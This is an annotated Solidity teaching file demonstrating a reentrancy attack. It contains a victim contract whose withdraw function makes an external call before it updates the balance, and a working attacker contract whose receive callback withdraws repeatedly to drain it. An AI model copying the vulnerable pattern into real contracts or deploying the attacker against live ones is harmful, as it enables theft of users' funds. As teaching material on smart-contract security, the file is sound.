// SPDX-License-Identifier: MIT
pragma solidity 0.8.20;

/*//////////////////////////////////////////////////////////////
                               REENTRANCY
//////////////////////////////////////////////////////////////*/

contract ReentrancyVictim {
    /* 
        userBalance is a public mapping that associates an address (the key) with a uint256 (the value).
        Making it public allows any other contract or external account to read the balance of any address. 
        This can be useful for transparency, allowing users to verify their balance or others to check the state of the contract.

        Additionally, when you declare a public state variable in Solidity, the compiler automatically creates a getter function for it. 
        This function has the same name as the variable and returns the value corresponding to a provided key.
    */
    mapping(address => uint256) public userBalance;

    /*
        payable: This keyword allows the function to receive Ether together with a call. 
        If a function is not marked payable, it will reject any Ether sent to it.
    */
    function deposit() public payable {
        /*
            msg.sender is a special global variable that refers to the address of the entity (account or contract) 
            that called the current function.
            msg.value is a special variable that contains the amount of wei sent with the transaction 
            (where 1 Ether = 10^18 wei) sent with the transaction.
        */
        userBalance[msg.sender] += msg.value;
    }

    function withdrawBalance() public {
        /*
            The contract maintains a mapping userBalance that maps an address to a uint256. 
            This represents the balance of Ether each address has deposited into the contract.
        */
        uint256 balance = userBalance[msg.sender];
        // An external call and then a state change!
        // External call

        /* 
            Attempts to transfer the balance amount of Ether to the sender of the transaction (msg.sender). 
            The call function is a low-level function to interact with other contracts and it returns a 
            boolean indicating whether the call was successful or not.
        */
        (bool success,) = msg.sender.call{value: balance}("");
        if (!success) {
            revert();
        }

        // State change
        userBalance[msg.sender] = 0;
    }
}

/* 
    The attack function and the receive function together create a reentrancy attack. 
    The attack function starts the attack, and the receive function is called as a callback during the withdrawBalance 
    function of the victim contract, allowing the ReentrancyAttacker to repeatedly withdraw funds before the victim 
    contract can update its state.
*/
contract ReentrancyAttacker {
    ReentrancyVictim victim;

    constructor(ReentrancyVictim _victim) {
        victim = _victim;
    }

    function attack() public payable {
    /*
        This is a public function that can be called by anyone. 
        It first calls the deposit function of the victim contract, depositing 1 ether. 
        Then it calls the withdrawBalance function of the victim contract, attempting to withdraw the balance.
    */        
        victim.deposit{value: 1 ether}();
        victim.withdrawBalance();
    }

    receive() external payable {
        /*
            This is a fallback function that is called when the contract receives ether without a function being explicitly called. 
            If the balance of the victim contract is greater than or equal to 1 ether, it calls the withdrawBalance function of the victim contract. 
        */

        if (address(victim).balance >= 1 ether) {
            victim.withdrawBalance();
        }
    }
}
